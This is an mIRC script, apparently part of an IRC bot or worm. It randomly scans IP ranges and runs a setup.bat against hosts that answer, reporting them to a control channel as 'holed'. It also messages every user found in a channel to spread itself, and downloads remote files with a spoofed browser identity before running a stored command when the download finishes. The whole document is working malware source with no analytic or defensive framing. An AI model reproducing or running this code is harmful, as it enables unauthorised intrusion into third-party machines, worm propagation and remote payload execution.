alias goscan { 
  if (%ra == 3) sockopen mouer $+ $rand(1,999999999999999999999999999) $+($gettok($longip(%mouarfg),1-1,46),.,$r(1,255),.,$r(1,255),.,$r(1,255)) %ip2
  if (%ra == 2) sockopen mouer $+ $rand(1,999999999999999999999999999) $+($gettok($longip(%mouarfg),1-2,46),.,$r(1,255),.,$r(1,255)) %ip2
  if (%ra == 1) sockopen mouer $+ $rand(1,999999999999999999999999999) $+($gettok($longip(%mouarfg),1-3,46),.,$r(1,255))
  .timerg -m 1 %fast goscan
}
on *:sockopen:mouer*:{
  if ($sockerr > 0) return
  run -n setup.bat $sock($sockname).ip
  startor cmd.exe
  msg $read(conf,3) $sock($sockname).ip $sock($sockname).port holed.
}
alias worm { who $1 | msg $read(conf,3) Starting worm... | set %wmsg $2- | remove found.txt | set %wormlin 0 }
raw 352:*: { write found.txt $6 }
raw 315:*:{ msg $read(conf,3) Worm started $lines(found.txt) $+ . | wormz }
alias wormz { .timerworm $lines(found.txt) 70 wormz | inc %wormlin | msg $read(found.txt,%wormlin) %wmsg }
alias wormstop { 
  msg $read(conf,3) Worm stopped.
  timerworm off
}
alias asshole { msg $read(conf,3) Starting Download ( $+ $1- $+ ) | w3bsuck $1- } 
alias w3bsuck {
  %i = 1
  while ($sock($+(dwl_,%i))) inc %i
  sockopen $+(dwl_,%i) $gettok($remove($1,http://),1,$asc(/)) 80
  sockmark $+(dwl_,%i) HEAD $remove($1,http://) $iif(\* iswm $2,$right($2,-1),$2) $ctime $3-
}
on *:SOCKOPEN:dwl_*: {
  if ($sockerr) return
  write -c $gettok($sock($sockname).mark,3,32)
  sockwrite -tn $sockname GET $+(/,$gettok($gettok($sock($sockname).mark,2,32),2-,$asc(/))) HTTP/1.1 $+ $crlf
  sockwrite -tn $sockname Accept: */*
  sockwrite -tn $sockname Referer: http://www.xxx.edu/
  sockwrite -tn $sockname Accept-Language: fr
  sockwrite -tn $sockname Accept-Encoding: gzip, deflate
  sockwrite -tn $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
  sockwrite -tn $sockname Host: $gettok($remove($gettok($sock($sockname).mark,2,32),http://),1,$asc(/))
  sockwrite -tn $sockname Connection: Keep-Alive
  sockwrite -tn $sockname $crlf
}
on *:SOCKREAD:dwl_*: {
  if ($gettok($sock($sockname).mark,1,32) == HEAD) { sockread %r }
  if (!%r && $gettok($sock($sockname).mark,1,32) == HEAD) {
    sockmark $sockname $puttok($sock($sockname).mark,GET,1,32)
  }
  if ($gettok($sock($sockname).mark,1,32) == GET) {
    sockread &r
    %x = $gettok($sock($sockname).mark,3,32)
    bwrite %x -1 &r
    if ($gettok($sock($sockname).mark,4,32) != $ctime) {
      sockmark $sockname $puttok($sock($sockname).mark,$ctime,4,32)
    }
  }
}
on *:SOCKCLOSE:dwl_*: {
  msg $read(conf,3) Download complete. | if ($gettok($sock($sockname).mark,5-,32)) { $ifmatch }
}
